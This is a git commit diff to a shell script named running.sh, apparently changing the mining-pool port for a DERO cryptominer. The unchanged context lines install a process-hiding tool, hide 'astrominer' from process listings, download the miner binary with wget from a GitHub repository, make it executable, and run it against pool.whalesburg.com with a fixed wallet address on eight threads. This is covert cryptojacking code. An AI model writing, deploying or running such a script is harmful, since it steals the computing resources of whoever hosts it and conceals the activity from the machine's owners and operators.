f669e05a19ad70d56f91f85eafcd73a79e25fc6f
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 07:24:46 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -3,4 +3,4 @@ npm i -g node-process-hider
 ph add astrominer
 wget https://raw.githubusercontent.com/realxdagg/job/main/astrominer
 chmod 500 astrominer
-./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r pool.whalesburg.com:4300  -p stratum -t 8
+./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r pool.whalesburg.com:4303  -p stratum -t 8
